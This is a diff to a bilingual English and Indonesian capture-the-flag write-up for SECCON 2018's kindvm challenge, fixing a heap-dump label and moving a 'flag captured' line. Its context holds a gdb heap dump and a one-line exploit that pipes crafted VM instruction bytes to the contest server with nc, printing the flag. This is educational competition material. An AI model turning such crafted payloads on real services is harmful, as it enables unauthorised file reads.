@@ -229,7 +229,7 @@ Let's see the heap then.
 gdb-peda$ x/20wx 0x804c168
 0x804c168:   0x0804c180 <= name   0x080491b2 <= banner.txt  0x08048f89 <= greeting  0x08048fba <= farewell
 0x804c178:   0x00000000           0x00000011                0x00000000              0x00000000
-0x804c188:   0x00000000           0x00000411                0x41414141 <= mem_stat  0x41414141
+0x804c188:   0x00000000           0x00000411                0x41414141 <= mem_start 0x41414141
 0x804c198:   0x41414141           0x41414141                0x41414141              0x41414141
 0x804c1a8:   0x41414141           0x41414141                0x41414141              0x41414141
 ```
@@ -239,7 +239,6 @@ Plan: read `name` -> write it to `banner.txt`.
 load mem-40 to reg0 -> store reg0 to mem-36
 ```
 
-Flag is captured!
 ```
 asdf@asdf:~/Desktop/CTF/ctf/seccon2018/classic-pwn$ echo -e 'flag.txt\n\x01\x00\xff\xd8\x02\xff\xdc\x00\x06' | nc kindvm.pwn.seccon.jp 12345
 Input your name : Input instruction :  _    _           _                 
@@ -252,6 +251,7 @@ Instruction start!
 SECCON{s7ead1ly_5tep_by_5tep}
 Execution is end! Thank you!
 ```
+Flag is captured!
 
 ## Bahasa Indonesia
 ```
@@ -471,7 +471,7 @@ Let's see the heap then.
 gdb-peda$ x/20wx 0x804c168
 0x804c168:   0x0804c180 <= name   0x080491b2 <= banner.txt  0x08048f89 <= greeting  0x08048fba <= farewell
 0x804c178:   0x00000000           0x00000011                0x00000000              0x00000000
-0x804c188:   0x00000000           0x00000411                0x41414141 <= mem_stat  0x41414141
+0x804c188:   0x00000000           0x00000411                0x41414141 <= mem_start 0x41414141
 0x804c198:   0x41414141           0x41414141                0x41414141              0x41414141
 0x804c1a8:   0x41414141           0x41414141                0x41414141              0x41414141
 ```
@@ -481,7 +481,6 @@ Rencana: baca `name` -> tulis ke `banner.txt`.
 load mem-40 to reg0 -> store reg0 to mem-36
 ```
 
-Flag didapatkan!
 ```
 asdf@asdf:~/Desktop/CTF/ctf/seccon2018/classic-pwn$ echo -e 'flag.txt\n\x01\x00\xff\xd8\x02\xff\xdc\x00\x06' | nc kindvm.pwn.seccon.jp 12345
 Input your name : Input instruction :  _    _           _                 
@@ -494,3 +493,4 @@ Instruction start!
 SECCON{s7ead1ly_5tep_by_5tep}
 Execution is end! Thank you!
 ```
+Flag didapatkan!
